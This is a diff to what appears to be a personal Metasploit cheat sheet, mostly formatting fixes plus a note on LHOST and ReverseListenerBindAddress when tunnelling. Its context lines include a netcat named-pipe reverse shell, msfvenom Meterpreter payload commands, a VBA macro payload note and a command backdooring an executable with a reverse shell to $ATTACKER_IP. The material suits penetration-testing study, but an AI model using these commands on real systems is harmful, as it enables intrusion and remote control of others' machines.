@@ -52,13 +52,16 @@ Module categories:
 Note that Metasploit 6 apparently calls these “framework plugins” now.
 
 * **Remember:** Open up the port Metasploit’s going to use in your firewall *before* running the exploit. Generally this is port 4444 by default (set with LPORT).
-* **Also Remember:** Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
-* **Also ALSO Remember:** Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you’re trying to exploit a service that’s not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine’s external address, as the exploit won’t be connecting back over the SSH tunnel (obviously)!
+* **Also Remember:** Be sure to set `LHOST` (and, when applicable, `SRVHOST`) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving `SRVHOST` at the default of 0.0.0.0.)
+* **Also ALSO Remember:** Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you’re trying to exploit a service that’s not exposed externally in order to elevate your privileges). When doing this, remember that `LHOST` is still your machine’s external address, as the exploit won’t be connecting back over the SSH tunnel (obviously)! Since `LHOST` is also used to determine where the exploit’s listener binds to, it’s sometimes necessary to set the optional `ReverseListenerBindAddress` in these cases (typically when you do this, `LHOST` will be some remote system you’re tunneled into, and `ReverseListenerBindAddress` will be 127.0.0.1).
+
+#### Additional Resources
+* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)
 
 ### Module Options
-The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).
+The common `RHOSTS` option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).
 
-Most modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are *not* shown when running `show options`.
+Most modules support the `ARCH`, `PAYLOAD`, and `SESSION` options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are *not* shown when running `show options`.
 
 You can reset individual parameters using `unset`, and reset the entire module using `unset all`.
 
@@ -96,7 +99,7 @@ Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included
 
 **Note:** Metasploit defaults to sending 32-bit payloads, but an increasing number of things won’t work on a 64-bit system from a 32-bit meterpreter shell. It’s probably best to explicitly set the `payload` option to use a 64-bit payload unless you *know* that you’ll be dealing with a 32-bit system.
 
-List all available payloads using `msfvenom —list payloads` or `show payloads` from within the Metasploit console.
+List all available payloads using `msfvenom --list payloads` or `show payloads` from within the Metasploit console.
 
 A specific payload can be set in the Metasploit console use the `set PAYLOAD full/path/to/payload`.
 
@@ -257,7 +260,7 @@ What’s going on here?
 * We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
 * On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.
 
-Use `—list formats` to see available encoding formats.
+Use `--list formats` to see available encoding formats.
 
 ```bash
 # 32-bit Linux ELF Meterpreter payload
@@ -320,7 +323,7 @@ msfvenom -p windows/meterpreter/reverse_tcp \
 
 # VBA Meterpreter payload
 #
-# Note that this can’t be used as-is, but must first be copied
+# Note that this can't be used as-is, but must first be copied
 # into a Microsoft Office document as a macro. The generated
 # code hooks the Workbook_Open() function, but this must be
 # changed to Document_Open() for Word.
@@ -370,10 +373,10 @@ msiexec /quiet /qn /i $INSTALLER.msi
 
 ### Backdooring Executables
 ```bash
-msfvenom -a x64 —platform windows -x $UNMODIFIED_EXE_NAME \
+msfvenom -a x64 --platform windows -x $UNMODIFIED_EXE_NAME \
          -k -p windows/x64/shell_reverse_tcp \
          LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
-         -b “\x00” -f exe -o $BACKDOOR_EXE_NAME
+         -b "\x00" -f exe -o $BACKDOOR_EXE_NAME
 ```
 
 #### Additional Resources
